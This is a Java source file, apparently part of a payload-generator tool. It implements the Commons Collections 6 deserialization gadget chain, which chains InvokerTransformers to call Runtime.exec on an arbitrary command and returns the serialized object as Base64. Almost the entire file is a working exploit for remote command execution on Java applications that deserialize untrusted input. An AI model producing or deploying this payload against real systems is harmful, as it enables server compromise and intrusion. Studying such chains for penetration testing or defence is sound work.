package org.hasret.webserigen.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import org.hasret.webserigen.utils.serial;
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()

                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
*/

public class CommonsCollections6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException {
    }


    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {
        final String[] execArgs = new String[]{cmd};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(1));

        //上面和cc1 0 一样

        TiedMapEntry entry  = new TiedMapEntry(lazyMap,"2");
        HashMap<Object,Object> hashmap2 = new HashMap<>();
        hashmap2.put(entry,"3");
        lazyMap.remove("2");

        Class<LazyMap> c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(lazyMap,chainedTransformer);

//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(baos);
//        oos.writeObject(hashmap2);
//        oos.close();
//
//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bais);
//        ois.readObject();

        return serial.serializeBytesToB64(hashmap2);
    }
//    public static String serializeBytesToB64(Object obj) throws IOException {
//        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();
//            ObjectOutputStream oos = new ObjectOutputStream(baos)) {
//            oos.writeObject(obj);
//            oos.flush();
//            return Base64.getEncoder().encodeToString(baos.toByteArray());
//        }
//    }
}
